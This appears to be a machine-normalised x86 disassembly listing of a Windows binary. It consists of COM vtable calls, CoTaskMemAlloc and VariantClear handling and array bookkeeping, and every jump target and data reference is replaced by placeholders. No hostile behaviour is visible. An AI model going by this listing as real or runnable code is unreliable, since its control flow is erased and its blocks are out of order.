mov eax sub_46471f
call sub_42dc88
sub esp 0x98
push ebx
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x14 ]
cmp [ esi + 0x48 ] edi
mov [ ebp - 0x28 ] eax
mov eax [ esi + 0x10 ]
mov [ ebp - 0x2c ] eax
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
cmp eax edi
mov [ ebp - 0x20 ] eax
jl r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x24 ]
push edx
lea edx [ ebp - 0x1c ]
push edx
push r--data
push eax
call [ ecx + 0xc ]
cmp eax edi
jl r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x18 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
lea eax [ ebp - 0xa4 ]
push r--data
push eax
mov ecx esi
call sub_42a6db
or [ ebp - 0x84 ] 0xffffffff
lea eax [ ebp - 0x74 ]
push r--data
push eax
mov ecx esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x80 ] 0x18
mov [ ebp - 0x7c ] edi
mov [ ebp - 0x78 ] 0x1fb
call sub_42a6db
mov eax [ ebp - 0x1c ]
or [ ebp - 0x54 ] 0xffffffff
push edi
lea edx [ ebp - 0xa4 ]
push 0x28
mov [ ebp - 0x5c ] 0x1c
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x50 ] 0x20
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x48 ] 0x1e
mov ecx [ eax ]
push edx
push 0x2
push eax
call [ ecx + 0x10 ]
mov ebx eax
cmp ebx edi
jge r-xdata
push 0x10
call sub_441e89
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] edi
push edx
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x24 ]
lea ebx [ ebp - 0x44 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x1c ]
xor ecx ecx
push ebx
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x34 ] edi
mov edx [ eax ]
push ecx
push ecx
push eax
call [ edx + 0x18 ]
cmp eax edi
mov [ ebp - 0x20 ] eax
jge r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
jmp r-xdata
xor eax eax
push [ ebp - 0x14 ]
mov ecx eax
call sub_42a1cc
jmp r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
lea edx [ esi + 0x58 ]
push edx
mov edx [ esi + 0x4 ]
mov ecx [ eax ]
add edx 0xd8
push edx
push eax
call [ ecx + 0x14 ]
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x38 ]
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x24 ] eax
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x34 ] ecx
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x14 ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x50 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ esi + 0x50 ]
call sub_42a2f0
push 0x1c
call sub_441e89
cmp eax edi
pop ecx
je r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx edi
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x20 ]
cmp [ esi + 0x10 ] edi
mov [ ebp - 0x14 ] edi
jle r-xdata
mov ecx [ esi + 0x50 ]
mov [ esi + 0x54 ] eax
push [ ecx ]
mov ecx eax
call sub_42a305
mov ecx [ esi + 0x50 ]
mov eax [ esi + 0x54 ]
mov [ ecx + 0x8 ] eax
mov eax [ esi + 0x54 ]
mov eax [ eax + 0xc ]
mov [ esi + 0x10 ] eax
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call [ CoTaskMemAlloc@IAT ]
mov ecx [ esi + 0x10 ]
mov [ esi + 0x14 ] eax
lea ecx [ ecx + ecx * 4 ]
shl ecx 0x3
push ecx
push edi
push eax
call sub_42dc30
mov ecx [ esi + 0x50 ]
add esp 0xc
call sub_42a21d
mov ecx [ esi + 0x50 ]
call sub_429c47
jmp r-xdata
mov eax [ ebp - 0x2c ]
cmp eax edi
jle r-xdata
xor eax eax
push 0xa
mov ecx eax
call sub_43cdcd
jmp r-xdata
push [ ebp - 0x28 ]
call [ CoTaskMemFree@IAT ]
add ecx 0x24
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] ecx
push 0x1c
call sub_441e89
pop ecx
mov [ ebp - 0x18 ] eax
cmp eax edi
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ esi + 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
inc [ ebp - 0x14 ]
mov [ ebx + ecx + 0x24 ] eax
mov eax [ ebp - 0x14 ]
add ebx 0x28
cmp eax [ esi + 0x10 ]
jl r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call sub_43ce0c
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
cmp ecx edi
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ebx [ ebx ]
push 0x1
push [ eax + 0x8 ]
mov ecx esi
call [ edx + 0x8 ]
jmp r-xdata
add [ ebp - 0x10 ] 0x28
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov ebx [ eax + 0x4 ]
sub_42a1cc
mov eax sub_46473f
call sub_42dc88
sub esp 0x14
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ esi ] edi
mov [ ebp - 0x4 ] edi
mov [ esi + 0x4 ] edi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
push esi
call sub_42c685
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
call sub_429bcd
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_42a21d
push esi
mov esi ecx
call sub_429c47
mov eax [ esi ]
push 0x0
push eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
test eax eax
jl r-xdata
pop esi
retn
push 0x1
push 0x0
mov ecx esi
call sub_42a240
sub_42a240
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push esi
mov esi ecx
call sub_429c47
lea edx [ ebp - 0x4 ]
lea eax [ esi + 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
mov dl [ ebp + 0xc ]
neg dl
sbb edx edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
and edx 0x2
dec edx
mov ecx [ eax ]
push edx
push [ ebp + 0x8 ]
push 0x0
push eax
call [ ecx + 0x14 ]
test eax eax
jne r-xdata
pop esi
leave
retn 0x8
push edi
mov ecx esi
call sub_42a299
mov edi eax
test edi edi
jge r-xdata
mov eax edi
pop edi
mov ecx esi
call sub_429c47
sub_42a299
push ebx
push esi
mov esi ecx
push edi
xor eax eax
xor edi edi
mov ecx [ esi + 0x8 ]
mov ebx [ ecx + 0x4 ]
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x8 ]
mov ecx [ ecx ]
cmp [ ecx + edi * 8 + 0x4 ] 0x0
je r-xdata
inc edi
cmp edi ebx
jb r-xdata
push edi
mov ecx esi
call sub_42a2cd
test eax eax
jl r-xdata
sub_42a2cd
mov eax [ ecx + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov edx [ eax + 0x8 ]
mov eax [ eax ]
push edx
mov esi [ eax + esi * 8 ]
mov eax [ ecx ]
push esi
push [ ecx + 0xc ]
mov edi [ eax ]
push eax
call [ edi + 0x10 ]
pop edi
pop esi
retn 0x4
sub_42a305
mov eax sub_46475c
call sub_42dc88
sub esp 0x20
push ebx
push esi
push edi
mov ebx ecx
xor edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x14 ] edi
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
push ecx
push rw-data
mov eax [ esi ]
push esi
mov [ ebp - 0x4 ] edi
call [ eax ]
cmp eax edi
mov [ ebp + 0x8 ] eax
jge r-xdata
cmp [ ebx + 0x10 ] 0x0
mov [ ebp + 0x8 ] edi
lea edi [ ebx + 0x10 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
cmp eax edi
je r-xdata
mov [ ebx + 0x18 ] 0x1
and [ ebp - 0x1c ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x1c ]
push ecx
push rw-data
push esi
mov [ ebp - 0x4 ] 0x1
call [ eax ]
mov esi eax
test esi esi
jge r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp - 0x18 ]
xor esi esi
cmp eax esi
mov [ ebp - 0x4 ] esi
jne r-xdata
mov eax [ ebp - 0x1c ]
lea edx [ ebx + 0x14 ]
push edx
lea edx [ ebx + 0xc ]
mov ecx [ eax ]
push edi
push edx
push eax
call [ ecx + 0xc ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x1c ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] esi
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
cmp eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ ebx + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
lea esi [ esi + esi * 2 ]
shl esi 0x4
add eax esi
cmp [ eax + 0x10 ] 0x400
ja r-xdata
je r-xdata
mov eax [ ebx + 0xc ]
and [ ebp - 0x18 ] 0x0
imul eax eax 0x34
push eax
mov [ ebp - 0x4 ] 0x2
call sub_441e89
pop ecx
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
mov eax esi
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push [ ebp + 0x8 ]
and [ ebx + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x6
call sub_441e89
pop ecx
mov [ ebx + 0x8 ] eax
jmp r-xdata
push 0x1
mov ecx ebx
call sub_42a5b6
mov esi eax
test esi esi
jge r-xdata
and [ ebp - 0x2c ] 0x0
push 0x14
mov [ ebp - 0x4 ] 0x4
call sub_441e89
pop ecx
mov edx eax
jmp r-xdata
cmp [ eax + 0x14 ] 0xd
je r-xdata
mov eax 0x8007000e
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ ebp - 0x4 ] 0x0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x4 ] 0x1
push [ ebp - 0x18 ]
call sub_441eb2
pop ecx
jmp r-xdata
and [ ebp - 0x4 ] 0x0
test edx edx
je r-xdata
xor edx edx
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
push [ ebx ]
push [ ebx + 0xc ]
push [ ebp - 0x18 ]
call sub_42a612
push [ ebp - 0x18 ]
mov esi eax
call sub_441eb2
add esp 0x18
push [ ebp - 0x18 ]
call sub_441eb2
pop ecx
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
test eax eax
and [ edx ] 0x0
lea edi [ edx + 0x4 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x20 ]
mov eax [ ebx + 0x10 ]
lea esi [ esi + esi * 2 ]
shl esi 0x4
mov [ eax + esi + 0x14 ] 0xd
mov eax [ ebx + 0x10 ]
mov [ eax + esi + 0x10 ] 0x4
mov eax [ ebx + 0x10 ]
add eax esi
mov cx [ eax + 0x14 ]
cmp cx 0x81
je r-xdata
inc [ eax + 0x10 ]
cmp cx 0x82
jne r-xdata
cmp esi [ ebx + 0xc ]
jae r-xdata
mov eax [ ebx + 0x10 ]
push edx
add eax esi
mov edi [ eax + 0x10 ]
mov ecx edi
and ecx 0x3
add ecx edi
add ecx [ ebp + 0x8 ]
lea edi [ ecx + 0x4 ]
push edi
push ecx
push [ ebp + 0x8 ]
mov cl [ eax + 0x17 ]
push 0x0
push ecx
mov cl [ eax + 0x16 ]
push ecx
mov cx [ eax + 0x14 ]
push [ eax + 0x10 ]
push ecx
push [ eax + 0x8 ]
push [ ebp - 0x24 ]
call sub_42a65c
mov eax [ ebx + 0x10 ]
add [ ebp - 0x24 ] 0x34
mov ecx [ ebp + 0x8 ]
add esp 0x2c
add edi 0x4
inc [ ebp - 0x20 ]
mov [ eax + esi + 0x4 ] ecx
mov esi [ ebp - 0x20 ]
mov [ ebp + 0x8 ] edi
jmp r-xdata
sub_42a5b6
mov eax sub_464768
call sub_42dc88
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
and [ ebp - 0x4 ] 0x0
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
and [ esi ] 0x0
mov [ esi + 0x4 ] eax
shl eax 0x3
push eax
call sub_441e89
pop ecx
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
neg eax
sbb eax eax
pop edi
and eax 0x7ff8fff2
pop esi
add eax 0x8007000e
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_42a612
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0xc ]
mov eax [ esi + 0x24 ]
push 0x0
push [ ebp + 0x10 ]
mov edx [ ecx ]
neg eax
push [ ebp + 0x14 ]
sbb eax eax
and eax 0x2
push esi
inc eax
push edi
inc eax
push eax
push ecx
call [ edx + 0x10 ]
test edi edi
mov ebx eax
jle r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
pop ebp
retn
add esi 0x14
push [ esi ]
call sub_441eb2
add esi 0x34
dec edi
pop ecx
jne r-xdata
sub_42a65c
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push esi
push edi
xor ecx ecx
push 0x1
test dh 0x40
pop esi
je r-xdata
mov [ eax + 0x20 ] ecx
mov [ eax + 0x20 ] esi
jmp r-xdata
mov edx [ ebp + 0x2c ]
cmp edx ecx
je r-xdata
mov [ eax + 0x1c ] 0x3
mov [ eax + 0x8 ] edx
mov edi [ ebp + 0x30 ]
mov [ eax + 0x30 ] dx
mov dl [ ebp + 0x18 ]
mov [ eax + 0x14 ] edi
mov edi [ ebp + 0x20 ]
mov [ eax + 0x32 ] dl
mov dl [ ebp + 0x1c ]
mov [ eax + 0x24 ] edi
mov edi [ ebp + 0xc ]
mov [ eax + 0x33 ] dl
mov edx [ ebp + 0x24 ]
mov [ eax ] edi
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x14 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0x28 ]
mov [ eax + 0x1c ] esi
pop edi
cmp edx ecx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] ecx
pop esi
je r-xdata
pop ebp
retn
or [ eax + 0x1c ] 0x4
mov [ eax + 0xc ] edx
sub_42a6db
mov ecx [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov eax [ ebx + 0x10 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebx + 0x10 ]
sub eax 0x0
je r-xdata
mov esi ebx
mov edi ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec eax
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push [ ebx + 0x14 ]
push eax
call sub_42fdd5
pop ecx
pop ecx
mov esi ebx
mov edi ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x14 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
dec eax
je r-xdata
push 0x1
pop eax
push [ ebx + 0x14 ]
call sub_42e686
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
call [ CoTaskMemAlloc@IAT ]
mov ecx [ esp + 0x10 ]
test eax eax
mov [ ecx + 0x14 ] eax
je r-xdata
jmp r-xdata
sub_42a747
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
push edi
mov eax [ esi ]
je r-xdata
mov ecx esi
call [ eax + 0x14 ]
mov eax [ esi + 0x10 ]
xor ecx ecx
cmp eax ebx
mov [ ebp + 0xc ] eax
jle r-xdata
push ebx
push [ ebp + 0x8 ]
call [ eax + 0x8 ]
cmp [ esi + 0x48 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov esi [ esi + 0x14 ]
lea edi [ esi + 0x24 ]
jmp r-xdata
xor edi edi
cmp [ esi + 0x10 ] ebx
jle r-xdata
xor edi edi
cmp [ esi + 0x10 ] ebx
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x90 ] 0x0
jmp r-xdata
mov eax [ esi + 0x14 ]
mov eax [ ebx + eax + 0x1c ]
test eax eax
je r-xdata
mov ebx [ esi + 0x54 ]
lea eax [ edi + 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0xc ]
mov ecx ebx
push eax
call sub_42a883
test al al
je r-xdata
inc ecx
add edi 0x28
cmp ecx [ ebp + 0xc ]
jl r-xdata
mov edx eax
mov ebx eax
mov eax [ eax ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp + 0x8 ]
je r-xdata
inc edi
add ebx 0x28
cmp edi [ esi + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push eax
mov ecx [ ecx + 0x9c ]
push ecx
call sub_42d51e
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
lea eax [ ecx + ecx * 4 ]
push ebx
mov ecx [ esi + eax * 8 + 0x24 ]
call sub_43cf3d
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ esi + 0x14 ]
push [ ebp + 0x8 ]
lea eax [ edi + edi * 4 ]
mov ecx [ ecx + eax * 8 + 0x24 ]
call sub_43cef0
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi [ esi + 0x10 ]
jl r-xdata
push eax
lea ecx [ ebp - 0x4 ]
call sub_442208
mov eax [ ebp + 0x8 ]
push [ ebp - 0x4 ]
mov eax [ eax + 0x9c ]
push eax
call sub_42d51e
mov ebx eax
pop ecx
neg ebx
pop ecx
sbb bl bl
lea ecx [ ebp - 0x4 ]
inc bl
call sub_442148
test bl bl
jne r-xdata
sub_42a883
cmp [ ecx + 0x18 ] 0x0
push esi
push edi
je r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ esp + 0xc ]
mov ecx [ ecx + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ esi ]
lea ecx [ ecx + edx - 0x1 ]
cmp eax ecx
ja r-xdata
mov esi [ ecx + 0xc ]
xor edi edi
test esi esi
jbe r-xdata
xor al al
jmp r-xdata
sub eax edx
mov [ esi ] eax
mov edx [ esp + 0xc ]
mov ecx [ ecx + 0x10 ]
add ecx 0x8
mov eax [ edx ]
pop edi
pop esi
retn 0x4
mov [ edx ] edi
jmp r-xdata
inc edi
add ecx 0x30
cmp edi esi
jb r-xdata
mov al 0x1
cmp [ ecx ] eax
je r-xdata
sub_42a8d6
cmp [ esp + 0x8 ] 0x0
push esi
mov esi ecx
mov eax [ esi ]
je r-xdata
mov ecx esi
call [ eax + 0x14 ]
push 0x0
add esi 0x18
push [ esp + 0xc ]
mov ecx esi
call sub_43cf74
test eax eax
je r-xdata
push 0x0
push [ esp + 0xc ]
call [ eax + 0x4 ]
push [ esp + 0x8 ]
lea ecx [ esi + 0x18 ]
call sub_43cef0
jmp r-xdata
pop esi
retn 0x8
push eax
mov ecx esi
call sub_43cf3d
sub_42a91e
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x48 ] edi
je r-xdata
cmp [ esi + 0x40 ] edi
push ebx
je r-xdata
call sub_42aac8
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ esi + 0x38 ] edi
cmp ecx edi
jle r-xdata
cmp [ esi + 0x38 ] edi
jle r-xdata
pop edi
pop esi
leave
retn
mov eax [ esi + 0x38 ]
cmp eax edi
jle r-xdata
mov eax [ esi + 0x14 ]
add eax 0x24
cmp [ esi + 0x38 ] 0x0
jle r-xdata
xor ebx ebx
xor edi edi
cmp [ esi + 0x10 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] edi
jle r-xdata
lea eax [ eax + eax * 2 ]
shl eax 0x4
push eax
call sub_441e89
pop ecx
mov [ esi + 0x3c ] eax
mov edx [ eax ]
add eax 0x28
mov edx [ edx + 0xc ]
add [ esi + 0x38 ] edx
dec ecx
jne r-xdata
xor edi edi
mov [ esi + 0x40 ] edi
push [ esi + 0x40 ]
call sub_441eb2
push [ esi + 0x3c ]
call sub_441eb2
pop ecx
pop ecx
mov eax ebx
add eax [ esi + 0x40 ]
push eax
call [ VariantClear@IAT ]
inc edi
add ebx 0x10
cmp edi [ esi + 0x38 ]
jl r-xdata
mov ecx [ esi + 0x38 ]
mov eax [ esi + 0x8 ]
mov edi ecx
push 0x0
mov edx [ eax ]
shl edi 0x4
push edi
push [ esi + 0x3c ]
push ecx
push eax
call [ edx + 0x10 ]
mov eax [ esi + 0x38 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x8 ] edi
xor edi edi
cmp [ esi + 0x38 ] ebx
jle r-xdata
shl eax 0x4
push eax
call sub_441e89
pop ecx
mov [ esi + 0x40 ] eax
inc [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x28
mov eax [ ebp - 0xc ]
cmp eax [ esi + 0x10 ]
jl r-xdata
lea edi [ edi + edi * 2 ]
shl edi 0x4
mov ecx esi
call sub_42aac8
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
pop ebx
mov eax ebx
push 0x10
add eax [ esi + 0x40 ]
push 0x0
push eax
call sub_42dc30
mov eax [ esi + 0x40 ]
add esp 0xc
and [ ebx + eax ] 0x0
inc edi
add ebx 0x10
cmp edi [ esi + 0x38 ]
jl r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + eax + 0x24 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
mov ebx [ ebx ]
mov ecx esi
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
add eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x3c ]
add eax edi
push eax
call sub_42a6db
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x3c ]
shl eax 0x4
mov [ ecx + edi + 0x18 ] eax
mov eax [ esi + 0x3c ]
mov ecx [ ebp - 0x10 ]
and [ eax + edi + 0x1c ] 0x0
mov eax [ esi + 0x3c ]
or [ eax + edi + 0x24 ] 0xffffffff
mov eax [ esi + 0x3c ]
or [ eax + edi + 0x20 ] 0xffffffff
mov eax [ esi + 0x3c ]
inc [ ebp - 0x4 ]
mov [ eax + edi + 0x28 ] 0x1
mov eax [ esi + 0x3c ]
mov ecx [ ecx + 0x98 ]
mov [ eax + edi + 0x2c ] ecx
add edi 0x30
test ebx ebx
jne r-xdata
mov edi [ ebp - 0x4 ]
sub_42aac8
push ebp
mov ebp esp
sub esp 0x18
xor edx edx
cmp [ ecx + 0x48 ] edx
je r-xdata
cmp [ ecx + 0x38 ] edx
jne r-xdata
mov ecx [ ecx + 0x50 ]
cmp ecx edx
je r-xdata
mov eax [ ecx + 0x40 ]
push ebx
mov ecx [ ecx + 0x8 ]
push esi
push edi
push 0x1
mov [ ebp - 0x10 ] eax
pop eax
lea ebx [ ebp - 0x18 ]
xor esi esi
push ebx
push edx
push esi
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov edi [ ecx ]
push r--data
push eax
push ecx
call [ edi + 0x20 ]
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
leave
retn
cmp [ ecx + 0xc ] edx
je r-xdata
call sub_42a299
leave
retn
sub_42ab25
mov eax sub_464828
call sub_42dc88
sub esp 0x134
and [ ebp - 0x3c ] 0x0
push ebx
push esi
lea eax [ ebp - 0x1c ]
push edi
mov esi ecx
push eax
call sub_426793
mov edi [ ebp + 0xc ]
mov ecx [ esi + 0x54 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x3c ]
push eax
push edi
call sub_42b2a1
cmp [ ebp - 0x3c ] 0x3
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_42663b
lea eax [ ebp - 0x1c ]
push eax
call [ VariantClear@IAT ]
jmp r-xdata
mov ebx [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx ebx
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0x10 ]
mov ebx [ VariantClear@IAT ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov ax [ ecx + eax + 0x14 ]
mov ecx 0x81
movzx eax ax
cmp eax ecx
jg r-xdata
sub eax 0x82
je r-xdata
cmp eax ecx
je r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
cmp eax 0x8
jg r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
dec eax
dec eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
cmp eax 0xb
je r-xdata
je r-xdata
push eax
lea ecx [ ebp - 0x40 ]
call sub_442208
mov eax [ eax ]
push 0x8
push eax
lea ecx [ ebp - 0x140 ]
mov [ ebp - 0x4 ] 0x4
call sub_42665b
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x5
call sub_426779
lea eax [ ebp - 0x140 ]
push eax
call ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_42663b
lea eax [ ebp - 0x1c ]
